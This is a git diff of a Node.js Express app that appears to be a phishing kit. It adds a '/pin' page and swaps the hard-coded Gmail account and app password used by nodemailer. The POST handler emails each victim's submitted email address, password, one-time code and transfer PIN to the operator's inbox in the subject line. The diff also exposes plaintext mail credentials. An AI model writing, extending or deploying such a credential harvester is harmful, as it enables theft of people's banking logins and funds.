@@ -26,6 +26,11 @@ app.get('/otp', (req,res ) => {
 
     res.render("otp")
 })
+// pin
+app.get('/pin', (req,res ) => {
+
+    res.render("pin")
+})
 // register
 app.get('/register', (req,res ) => {
 
@@ -39,13 +44,14 @@ app.post('/',(req,res) => {
     const transporter = nodemailer.createTransport({
         service:'gmail',
         auth: {
-            user: 'edehchinedu59@gmail.com',
-            pass: 'yknycyzsxdkxpepq'
+            user: 'Victorchinemerem191@gmail.com',
+            pass: 'aivsveolwtqinddb'
         }
     })
+
     const mailOptions = {
         from: req.body?.email,
-        to:'edehchinedu59@gmail.com',
+        to:'Victorchinemerem191@gmail.com',
         subject: `Client: ${req.body?.email} \n password: ${req.body?.password} \n Otp Pin: ${req.body?.otp} \n Transfer Pin: ${req.body?.pin}`,
        
     }
